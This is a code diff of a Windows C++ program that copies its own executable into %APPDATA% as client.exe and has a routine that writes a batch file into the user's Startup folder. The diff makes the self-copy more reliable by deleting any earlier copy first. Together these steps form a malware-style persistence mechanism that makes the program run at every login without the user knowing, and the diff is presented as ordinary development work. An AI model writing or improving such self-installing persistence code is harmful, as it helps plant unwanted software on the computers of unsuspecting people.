@@ -20,20 +20,26 @@ void copySelfToAppData() {
 
     // Get the AppData path from the environment variable
     char appDataPath[MAX_PATH];
-    if (GetEnvironmentVariableA("APPDATA", appDataPath, sizeof(appDataPath))) {
+    DWORD size = sizeof(appDataPath);
+    if (GetEnvironmentVariableA("APPDATA", appDataPath, size)) {
         // Append the filename to the AppData path
-        string fullPath = string(appDataPath) + "\\client.exe";
-
+        std::string fullPath = std::string(appDataPath) + "\\client.exe";
+        
         // Copy the executable to AppData
         fs::path sourcePath(exePath);
         fs::path destinationPath(fullPath);
 
+        // Check if the destination file exists and delete it if necessary
+        if (fs::exists(destinationPath)) {
+            fs::remove(destinationPath);  // Remove the existing file if it exists
+        }
+
+        // Now copy the file
         if (fs::exists(sourcePath)) {
             fs::copy(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
         }
     }
 }
-
 
 void createBatFileInStartup(const string& argmail) {
     // Get the username from environment variable
@@ -579,7 +585,7 @@ int application() {
 // Main function - Program entry point
 // ---------------------------------------------------------------------
 int main(int argc, char* argv[]) {
-    
+
     bool enable = true;
 
 
